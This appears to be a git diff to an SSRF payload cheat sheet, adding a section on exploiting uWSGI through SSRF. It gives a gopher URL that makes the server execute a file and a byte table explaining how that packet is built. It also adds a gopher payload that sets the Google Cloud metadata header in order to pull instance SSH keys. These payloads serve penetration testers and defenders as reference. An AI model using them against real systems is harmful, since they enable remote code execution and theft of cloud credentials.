@@ -29,6 +29,7 @@
   * [ldap://](#ldap)
   * [gopher://](#gopher)
   * [netdoc://](#netdoc)
+* [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
@@ -355,6 +356,28 @@ Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
 ssrf.php?url=gopher://127.0.0.1:4242/DATA
 ```
 
+## SSRF exploiting WSGI
+
+Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.
+
+```powershell
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+```
+
+| Header    |           |             |
+|-----------|-----------|-------------|
+| modifier1 | (1 byte)  | 0 (%00)     |
+| datasize  | (2 bytes) | 26 (%1A%00) |
+| modifier2 | (1 byte)  | 0 (%00)     |
+
+| Variable (UWSGI_FILE) |           |    |            |   |
+|-----------------------|-----------|----|------------|---|
+| key length            | (2 bytes) | 10 | (%0A%00)   |   |
+| key data              | (m bytes) |    | UWSGI_FILE |   |
+| value length          | (2 bytes) | 12 | (%0C%00)   |   |
+| value data            | (n bytes) |    | /tmp/test.py   |   |
+	
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -499,6 +522,12 @@ Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
 ```powershell
 http://metadata.google.internal/computeMetadata/v1beta1/
 http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+Required headers can be set using a gopher SSRF with the following technique
+
+```powershell
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
 ```
 
 Interesting files to pull out:
